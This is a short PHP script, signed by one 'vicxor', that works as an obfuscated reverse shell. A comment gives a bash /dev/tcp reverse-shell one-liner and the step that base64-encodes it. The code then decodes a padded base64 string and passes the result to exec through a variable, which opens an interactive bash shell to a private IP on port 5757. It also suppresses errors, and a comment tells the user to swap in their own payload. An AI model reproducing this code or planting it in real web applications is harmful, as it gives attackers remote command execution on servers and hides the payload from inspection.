<?php
//made by vicxor
//refrence
//echo "bash -c 'bash -i >& /dev/tcp/10.10.14.187/5757 0>&1'" | base64
@h();

function h(){
  try {
    set_time_limit(0);
    $s = "exec";
    $opa = "aaYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xOTIuMTI4LjM0LzU3NTcgMD4mMScK"; //CHANGE THIS BUT KEEP aa
    $kf = explode("\x15",base64_decode(substr($opa,2)));
    echo $s($kf[0]);
  } catch (\Exception $e) {

  }

}
?>
